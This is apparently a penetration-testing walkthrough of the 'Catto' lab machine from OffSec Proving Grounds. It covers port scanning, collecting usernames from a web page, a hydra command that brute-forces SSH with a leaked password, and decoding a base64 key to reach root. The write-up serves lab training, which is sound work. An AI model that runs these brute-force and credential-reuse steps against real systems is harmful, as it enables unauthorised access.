# Catto

## Info

Catto is an intermediate linux machine from offsec proving grounds.

## Nmap

All tcp port scan.

```
8080/tcp  open  http    syn-ack ttl 61 nginx 1.14.1
18080/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.37 ((centos))
30330/tcp open  http    syn-ack ttl 61 Node.js Express framework
34519/tcp open  http    syn-ack ttl 61 Node.js Express framework
37205/tcp open  unknown syn-ack ttl 61
42022/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.0 (protocol 2.0)
50400/tcp open  http    syn-ack ttl 61 Node.js Express framework
```

## User

Looking at the web page on port 30330, I see a paragraph on the minecraft book review stating a server had been set up for the following people.

```
keralis
xisuma
zombiecleo
mumbojumbo
sabel
yvette
zahara
sybilla
marcus
tabbatha
tabby
```

On the site home page is a link to the following page.

```
/page-2
```

I change this to page-1 and get a 404, but the index showed the following.

```
/new-server-config-mc
```

Which had the password.

```
WallAskCharacter305
```

Brute force with hydra.

```
hydra -L ./foundnames.txt -p 'WallAskCharacter305' -s 42022 192.168.213.139 ssh
```

```
[42022][ssh] host: 192.168.213.139   login: marcus   password: WallAskCharacter305
```

## Root

There is a hidden .bash file with base64 encoding, in /usr/bin there is a base64key binary.

```
/usr/bin/base64key F2jJDWaNin8pdk93RLzkdOTr60== WallAskCharacter305 1
```
